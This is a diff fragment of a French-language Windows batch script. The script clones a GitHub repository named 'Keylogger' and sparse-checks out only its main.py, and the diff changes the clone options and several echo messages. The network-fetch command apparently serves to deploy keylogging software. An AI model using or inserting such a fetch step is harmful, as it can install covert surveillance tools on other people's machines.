@@ -28,8 +28,8 @@ if errorlevel 1 (
 )
 
 REM Cloner le dépôt GitHub de manière sélective
-echo Clonage du dépôt GitHub de manière sélective...
-git clone --depth 1 --filter=blob:none --sparse https://github.com/coco324/Keylogger.git
+echo Clonage du dépôt GitHub...
+git clone https://github.com/coco324/Keylogger.git
 if errorlevel 1 (
     echo Échec du clonage du dépôt GitHub. Vérifiez l'URL.
     pause
@@ -37,11 +37,12 @@ if errorlevel 1 (
 )
 cd Keylogger
 
-REM Initialiser le clonage sélectif
+REM Récupérer uniquement le fichier main.py
+echo Configuration pour récupérer main.py uniquement...
 git sparse-checkout init --cone
-git sparse-checkout set main.py
+git sparse-checkout set "main.py"
 if errorlevel 1 (
-    echo Échec de la récupération de main.py dans le dépôt.
+    echo Échec de la récupération de main.py dans le dépôt. Vérifiez l'existence du fichier.
     pause
     exit /b
 ) else (
